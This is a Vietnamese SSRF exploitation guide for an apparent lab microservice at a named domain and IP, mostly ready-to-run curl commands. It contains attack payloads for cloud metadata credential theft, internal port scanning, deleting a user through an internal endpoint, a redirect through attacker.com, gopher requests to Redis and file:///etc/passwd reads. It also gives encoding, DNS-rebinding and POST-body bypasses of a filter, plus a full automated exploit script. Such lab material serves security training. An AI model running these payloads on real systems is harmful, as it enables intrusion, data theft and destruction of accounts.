# 🎯 HƯỚNG DẪN PHÁT HIỆN SSRF - BLACKBOX TESTING

## 📋 MỤC LỤC
1. [Reconnaissance - Thu thập thông tin](#1-reconnaissance)
2. [Endpoint Discovery - Tìm các điểm tấn công](#2-endpoint-discovery)
3. [SSRF Detection - Phát hiện lỗ hổng](#3-ssrf-detection)
4. [Exploitation - Khai thác](#4-exploitation)
5. [Bypass Techniques - Các kỹ thuật bypass](#5-bypass-techniques)

---

## 1. RECONNAISSANCE - THU THẬP THÔNG TIN

### 🔍 Bước 1: Spider toàn bộ website
```bash
# Sử dụng Burp Suite Spider
# Target: https://quangtx.io.vn
# - Bật Burp Proxy
# - Browse toàn bộ website thủ công
# - Spider tự động crawl các link

# Hoặc dùng tool command line
gospider -s https://quangtx.io.vn -c 10 -d 3 --sitemap --robots -o spider-results

# Lưu toàn bộ HTTP history từ Burp Suite
# - Proxy > HTTP History > Save Items
```

### 🔍 Bước 2: Tìm các tham số nhận URL
```bash
# Grep tìm các parameter có dạng URL trong HTTP history
cat burp-history.txt | grep -E "(url=|image|avatar|callback|redirect|fetch|webhook|api_url|share|review)"

# Các pattern cần chú ý:
# - ?url=
# - ?image_url=
# - ?avatar_url=
# - ?callback_url=
# - ?redirect_url=
# - ?fetch_url=
# - ?webhook=
# - ?api_url=
# - ?share_url=
# - ?review_url=
# - ?compare_url=
```

### 📊 Kết quả expected từ lab này:
```
GET /api/products/1/check_price?compare_url=... ← 🎯 SSRF candidate
GET /api/products/1/fetch_review?review_url=... ← 🎯 SSRF candidate
GET /api/products/1/share?share_api_url=... ← 🎯 SSRF candidate
POST /api/users/1/avatar (image_url parameter) ← 🎯 SSRF candidate
POST /api/users/me/avatar/validate (url parameter) ← 🎯 SSRF candidate
GET /api/users/me/avatar/validate?url=... ← 🎯 SSRF candidate
```

---

## 2. ENDPOINT DISCOVERY - TÌM CÁC ĐIỂM TẤN CÔNG

### 🎯 Phương pháp 1: Manual Testing với Burp Suite

#### A. Test từng endpoint có parameter URL
```http
# 1. Kiểm tra check_price endpoint
GET https://quangtx.io.vn/api/products/1/check_price?compare_url=https://google.com HTTP/1.1
Host: quangtx.io.vn
Authorization: Bearer eyJhbGc...

Quan sát response:
- Nếu trả về nội dung từ google.com → CÓ SSRF!
- Nếu timeout hoặc connection error → Server đang fetch URL
- Nếu 403 Forbidden → Gateway chặn
```

```http
# 2. Kiểm tra fetch_review endpoint
POST https://quangtx.io.vn/api/products/1/fetch_review HTTP/1.1
Host: quangtx.io.vn
Content-Type: application/json

{
  "review_url": "https://httpbin.org/anything"
}

Quan sát response:
- Nếu trả về data từ httpbin.org → CÓ SSRF!
```

```http
# 3. Kiểm tra avatar validate endpoint
POST https://quangtx.io.vn/api/users/me/avatar/validate HTTP/1.1
Host: quangtx.io.vn
Authorization: Bearer eyJhbGc...
Content-Type: application/json

{
  "url": "https://httpbin.org/headers"
}

Quan sát response:
- Nếu trả về headers từ httpbin.org → CÓ SSRF!
```

### 🎯 Phương pháp 2: Automated Scanning

#### A. Sử dụng ffuf - Fuzz các endpoint
```bash
# Tạo wordlist các parameter thường vulnerable SSRF
cat > ssrf-params.txt << EOF
url
image_url
avatar_url
callback_url
redirect_url
fetch_url
webhook
api_url
share_url
review_url
compare_url
source
target
destination
link
href
EOF

# Fuzz tìm parameter ẩn
ffuf -u "https://quangtx.io.vn/api/products/1/check_price?FUZZ=https://httpbin.org/anything" \
     -w ssrf-params.txt \
     -H "Authorization: Bearer YOUR_TOKEN" \
     -mc all \
     -fc 404,400 \
     -o ffuf-results.json

# Tìm endpoint ẩn
ffuf -u "https://quangtx.io.vn/api/products/1/FUZZ" \
     -w /path/to/api-endpoints.txt \
     -H "Authorization: Bearer YOUR_TOKEN" \
     -mc 200,201,301,302,403 \
     -o endpoints-discovered.json
```

#### B. Sử dụng Nuclei - Template scanning
```bash
# Install nuclei
go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest

# Scan SSRF với templates có sẵn
nuclei -u https://quangtx.io.vn -t nuclei-templates/ssrf/ -H "Authorization: Bearer YOUR_TOKEN"

# Tạo custom template cho lab này
cat > ssrf-lab-template.yaml << 'EOF'
id: ssrf-microservice-lab

info:
  name: SSRF in Microservice Lab
  author: tester
  severity: high
  description: Test SSRF endpoints in microservice lab
  tags: ssrf,microservice

requests:
  - method: GET
    path:
      - "{{BaseURL}}/api/products/1/check_price?compare_url=https://httpbin.org/anything"
      - "{{BaseURL}}/api/products/1/fetch_review?review_url=https://httpbin.org/anything"
      - "{{BaseURL}}/api/users/me/avatar/validate?url=https://httpbin.org/anything"
    
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "httpbin"
        part: body
      
      - type: status
        status:
          - 200
EOF

nuclei -t ssrf-lab-template.yaml -u https://quangtx.io.vn
```

#### C. Sử dụng SQLMap với SSRF tamper
```bash
# Test SSRF qua sqlmap (nếu có parameter injection)
sqlmap -u "https://quangtx.io.vn/api/products/1/check_price?compare_url=https://google.com" \
       --headers="Authorization: Bearer YOUR_TOKEN" \
       --batch --risk 3 --level 5 \
       --technique=T --time-sec=10
```

---

## 3. SSRF DETECTION - PHÁT HIỆN LỖ HỔNG

### 🧪 Test Case 1: Out-of-Band Detection (Blind SSRF)

#### Bước 1: Setup Burp Collaborator hoặc webhook.site
```bash
# Option 1: Burp Collaborator (Burp Suite Professional)
# Burp > Extensions > Burp Collaborator Client > Copy to clipboard
# Ví dụ: abc123.burpcollaborator.net

# Option 2: webhook.site (Free)
# Truy cập: https://webhook.site
# Copy unique URL: https://webhook.site/abc-xyz-123

# Option 3: interactsh (Free)
curl -s https://interactsh.com | grep -oP 'https://[a-z0-9]+\.interact\.sh'
# Kết quả: https://abc123.interact.sh
```

#### Bước 2: Test với callback URL
```bash
# Test 1: Check_price endpoint
curl -X GET "https://quangtx.io.vn/api/products/1/check_price?compare_url=https://abc123.burpcollaborator.net" \
     -H "Authorization: Bearer $TOKEN"

# Kiểm tra Burp Collaborator:
# - Nếu có HTTP request đến → SSRF CONFIRMED!
# - Nếu có DNS lookup → Blind SSRF CONFIRMED!
```

```bash
# Test 2: Avatar validate endpoint
curl -X POST "https://quangtx.io.vn/api/users/me/avatar/validate" \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"url": "https://abc123.webhook.site/test-ssrf"}'

# Kiểm tra webhook.site dashboard:
# - Nếu có request đến → SSRF CONFIRMED!
# - Xem headers để biết thêm thông tin (User-Agent, IP, etc.)
```

### 🧪 Test Case 2: Time-Based Detection
```bash
# Test với URL gây timeout (không tồn tại)
time curl -X GET "https://quangtx.io.vn/api/products/1/check_price?compare_url=http://192.0.2.1:81/test" \
     -H "Authorization: Bearer $TOKEN"

# Nếu response mất 10+ seconds → Server đang fetch URL → SSRF!
# Nếu response ngay lập tức → Có thể có validation hoặc không vulnerable
```

### 🧪 Test Case 3: Error-Based Detection
```bash
# Test với URL invalid format
curl -X GET "https://quangtx.io.vn/api/products/1/check_price?compare_url=invalid://test" \
     -H "Authorization: Bearer $TOKEN"

# Nếu error message chứa:
# - "Connection refused" → Server thử connect → SSRF!
# - "Invalid URL format" → Có validation, nhưng vẫn có thể bypass
# - "Timeout connecting to..." → SSRF!
```

---

## 4. EXPLOITATION - KHAI THÁC

### 🎯 Exploitation 1: Internal Service Enumeration

#### Bước 1: Test localhost
```bash
# Gateway chặn localhost, nhưng có thể có direct backend access
# Nếu backend services exposed ports (8081, 8082, 8083, 8084)

# Test direct access user-service (nếu có)
curl -X GET "https://quangtx.io.vn/api/products/1/check_price?compare_url=http://103.56.163.193:8081/api/users" \
     -H "Authorization: Bearer $TOKEN"

# Nếu gateway chặn, thử qua POST body (gateway chỉ check query params)
curl -X POST "https://quangtx.io.vn/api/products/1/fetch_review" \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"review_url": "http://localhost:8081/api/users"}'
```

#### Bước 2: Port scanning internal services
```bash
# Scan các port thường dùng
for port in 8080 8081 8082 8083 8084 5432 6379 3306 9200 27017; do
    echo "Testing port $port..."
    curl -s -X POST "https://quangtx.io.vn/api/products/1/fetch_review" \
         -H "Authorization: Bearer $TOKEN" \
         -H "Content-Type: application/json" \
         -d "{\"review_url\": \"http://localhost:$port\"}" \
         -w "\nStatus: %{http_code}, Time: %{time_total}s\n"
    echo "---"
done

# Phân tích kết quả:
# - Time < 1s + 403/500 error → Port closed
# - Time > 5s + timeout error → Port filtered
# - Status 200 + response data → Port open + service running!
```

### 🎯 Exploitation 2: Cloud Metadata Attack
```bash
# AWS metadata
curl -X POST "https://quangtx.io.vn/api/products/1/fetch_review" \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"review_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'

# Azure metadata
curl -X POST "https://quangtx.io.vn/api/products/1/fetch_review" \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"review_url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01"}' \
     -H "Metadata: true"

# GCP metadata
curl -X POST "https://quangtx.io.vn/api/products/1/fetch_review" \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"review_url": "http://metadata.google.internal/computeMetadata/v1/instance/"}'
```

### 🎯 Exploitation 3: Privilege Escalation via SSRF

#### Attack: Delete user qua IP whitelist bypass
```bash
# user-service có endpoint /api/users/delete/{id} chỉ cho phép internal IP
# Gateway chặn internal IPs, nhưng có thể bypass qua redirect hoặc POST body

# Option 1: Direct POST (nếu backend exposed)
curl -X POST "https://quangtx.io.vn/api/products/1/share" \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"share_api_url": "http://user-service:8081/api/users/delete/2"}'

# Option 2: Qua redirect chain (bypass gateway filter)
# Tạo server redirect:
# https://attacker.com/redirect → 302 → http://user-service:8081/api/users/delete/2

curl -X POST "https://quangtx.io.vn/api/products/1/fetch_review" \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"review_url": "https://attacker.com/redirect-to-delete-user-2"}'
```

---

## 5. BYPASS TECHNIQUES - CÁC KỸ THUẬT BYPASS

### 🔓 Bypass 1: HTTP Redirect Chain
```bash
# API Gateway chỉ check query parameter ban đầu
# Không follow redirects để validate destination

# Bước 1: Setup redirect server (Python)
cat > redirect-server.py << 'EOF'
from flask import Flask, redirect
app = Flask(__name__)

@app.route('/to-internal')
def redirect_to_internal():
    return redirect('http://user-service:8081/api/users', code=302)

@app.route('/to-localhost')
def redirect_to_localhost():
    return redirect('http://127.0.0.1:8081/api/users', code=302)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
EOF

# Bước 2: Deploy lên VPS public (không phải server target)
python3 redirect-server.py

# Bước 3: Test SSRF với redirect
curl -X POST "https://quangtx.io.vn/api/products/1/fetch_review" \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"review_url": "http://YOUR_VPS_IP:8000/to-internal"}'

# Kết quả: Gateway pass initial URL (public IP), nhưng backend fetch follow redirect → internal service!
```

### 🔓 Bypass 2: DNS Rebinding
```bash
# Thay đổi DNS resolution giữa gateway check và backend fetch

# Bước 1: Setup DNS rebinding domain
# Sử dụng dịch vụ: http://rebind.it hoặc tự host
# Domain: abc.7f000001.rbndr.us → ban đầu resolve về 7f000001 (127.0.0.1)

# Bước 2: Test với rebinding domain
curl -X POST "https://quangtx.io.vn/api/products/1/fetch_review" \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"review_url": "http://user-service.7f000001.rbndr.us:8081/api/users"}'

# Cơ chế:
# - Gateway check: DNS resolve về public IP → pass
# - Backend fetch (sau vài giây): DNS TTL expired, resolve về 127.0.0.1 → SSRF!
```

### 🔓 Bypass 3: URL Encoding & Obfuscation
```bash
# 1. URL encoding
curl -X GET "https://quangtx.io.vn/api/products/1/check_price?compare_url=http%3A%2F%2Flocalhost%3A8081" \
     -H "Authorization: Bearer $TOKEN"

# 2. Double encoding
curl -X GET "https://quangtx.io.vn/api/products/1/check_price?compare_url=http%253A%252F%252Flocalhost%253A8081" \
     -H "Authorization: Bearer $TOKEN"

# 3. IPv6 localhost
curl -X POST "https://quangtx.io.vn/api/products/1/fetch_review" \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"review_url": "http://[::1]:8081/api/users"}'

# 4. Hex encoded IP (127.0.0.1 = 0x7f000001)
curl -X POST "https://quangtx.io.vn/api/products/1/fetch_review" \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"review_url": "http://0x7f000001:8081/api/users"}'

# 5. Octal encoded IP
curl -X POST "https://quangtx.io.vn/api/products/1/fetch_review" \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"review_url": "http://0177.0.0.1:8081/api/users"}'

# 6. Integer IP (127.0.0.1 = 2130706433)
curl -X POST "https://quangtx.io.vn/api/products/1/fetch_review" \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"review_url": "http://2130706433:8081/api/users"}'

# 7. Mixed encoding
curl -X POST "https://quangtx.io.vn/api/products/1/fetch_review" \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"review_url": "http://127.0x00.0x00.0x01:8081/api/users"}'
```

### 🔓 Bypass 4: POST Body vs Query Parameter
```bash
# Gateway SSRFProtectionFilter chỉ check query params
# KHÔNG check POST body JSON fields!

# Test 1: Query param → BỊ CHẶN
curl -X GET "https://quangtx.io.vn/api/products/1/check_price?compare_url=http://localhost:8081" \
     -H "Authorization: Bearer $TOKEN"
# → 403 Forbidden

# Test 2: POST body → BYPASS GATEWAY!
curl -X POST "https://quangtx.io.vn/api/products/1/check_price" \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"compare_url": "http://localhost:8081/api/users"}'
# → 200 OK + SSRF thành công!

# Test 3: fetch_review (POST only, gateway không check)
curl -X POST "https://quangtx.io.vn/api/products/1/fetch_review" \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"review_url": "http://user-service:8081/api/users"}'
# → SSRF thành công!
```

### 🔓 Bypass 5: Protocol Smuggling
```bash
# 1. File protocol (nếu server support)
curl -X POST "https://quangtx.io.vn/api/products/1/fetch_review" \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"review_url": "file:///etc/passwd"}'

# 2. Gopher protocol (exploit Redis/Memcached)
curl -X POST "https://quangtx.io.vn/api/products/1/fetch_review" \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"review_url": "gopher://redis:6379/_SET%20ssrf%20test"}'

# 3. Dict protocol (port scanning)
curl -X POST "https://quangtx.io.vn/api/products/1/fetch_review" \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"review_url": "dict://user-service:8081/info"}'
```

---

## 6. AUTOMATED EXPLOITATION SCRIPT

```bash
#!/bin/bash
# ssrf-auto-exploit.sh

TARGET="https://quangtx.io.vn"
TOKEN="eyJhbGc..." # Your JWT token

echo "🎯 SSRF Exploitation Script for Microservice Lab"
echo "Target: $TARGET"
echo ""

# Test 1: Out-of-band detection
echo "[1] Testing out-of-band SSRF..."
COLLAB_URL="https://abc123.burpcollaborator.net"
curl -s -X POST "$TARGET/api/products/1/fetch_review" \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d "{\"review_url\": \"$COLLAB_URL/test-ssrf\"}" | jq .
echo "✓ Check Burp Collaborator for callback"
echo ""

# Test 2: Internal service enumeration
echo "[2] Scanning internal services..."
for service in user-service product-service inventory-service order-service; do
    echo "  Testing $service:8080..."
    curl -s -X POST "$TARGET/api/products/1/fetch_review" \
         -H "Authorization: Bearer $TOKEN" \
         -H "Content-Type: application/json" \
         -d "{\"review_url\": \"http://$service:8080/actuator/health\"}" \
         -w "Status: %{http_code}\n" | head -3
done
echo ""

# Test 3: Gateway bypass via POST body
echo "[3] Testing gateway bypass (POST body)..."
curl -s -X POST "$TARGET/api/products/1/check_price" \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"compare_url": "http://localhost:8081/api/users"}' | jq .
echo ""

# Test 4: URL encoding bypass
echo "[4] Testing URL encoding bypass..."
curl -s -X POST "$TARGET/api/products/1/fetch_review" \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"review_url": "http://[::1]:8081/api/users"}' | jq .
echo ""

# Test 5: Cloud metadata attack
echo "[5] Testing cloud metadata..."
curl -s -X POST "$TARGET/api/products/1/fetch_review" \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"review_url": "http://169.254.169.254/latest/meta-data/"}' | jq .
echo ""

echo "✅ Exploitation complete. Review results above."
```

---

## 7. BURP SUITE WORKFLOW

### 📋 Checklist for Burp Suite Testing

1. **Setup Proxy & Browser**
   ```
   - Configure browser to use Burp proxy (127.0.0.1:8080)
   - Visit https://quangtx.io.vn
   - Login and get JWT token
   ```

2. **Map Application**
   ```
   - Target > Site map
   - Spider the application
   - Note all endpoints with URL parameters
   ```

3. **Active Scanning**
   ```
   - Right-click on target endpoint
   - "Scan" > "Active Scan"
   - Enable "SSRF" check in scan configuration
   ```

4. **Manual Testing**
   ```
   - Repeater > Send requests với Burp Collaborator URL
   - Intruder > Fuzz các encoding formats
   - Collaborator > Poll for callbacks
   ```

5. **Extension: Backslash Powered Scanner**
   ```
   - Install from BApp Store
   - Automatically detect SSRF bypass techniques
   ```

---

## 8. EXPECTED RESULTS FROM LAB

### ✅ Confirmed SSRF Endpoints:

| Endpoint | Method | Parameter | Bypass Type | Risk |
|----------|--------|-----------|-------------|------|
| `/api/products/{id}/check_price` | POST | `compare_url` (JSON body) | POST body bypass | HIGH |
| `/api/products/{id}/fetch_review` | POST | `review_url` (JSON body) | POST body bypass | HIGH |
| `/api/products/{id}/share` | POST | `share_api_url` (JSON body) | POST body bypass | CRITICAL |
| `/api/users/me/avatar/validate` | POST | `url` (JSON body) | POST body bypass | HIGH |
| `/api/users/me/avatar/validate` | GET | `url` (query param) | Gateway blocked | MEDIUM |

### ⚠️ Gateway Protection Status:

- ✅ **Query parameters**: Blocked by SSRFProtectionFilter
- ❌ **POST body JSON**: NOT checked by gateway → Bypass!
- ❌ **Redirect chains**: NOT validated → Bypass!
- ❌ **DNS rebinding**: NOT protected → Bypass!
- ❌ **Direct backend access**: If ports exposed → Bypass!

---

## 📚 REFERENCES

- **OWASP SSRF**: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
- **PortSwigger SSRF**: https://portswigger.net/web-security/ssrf
- **HackTricks SSRF**: https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
- **PayloadsAllTheThings SSRF**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery

---

**Tạo:** 2025-12-02  
**Lab:** https://quangtx.io.vn  
**Status:** ✅ Active for blackbox testing
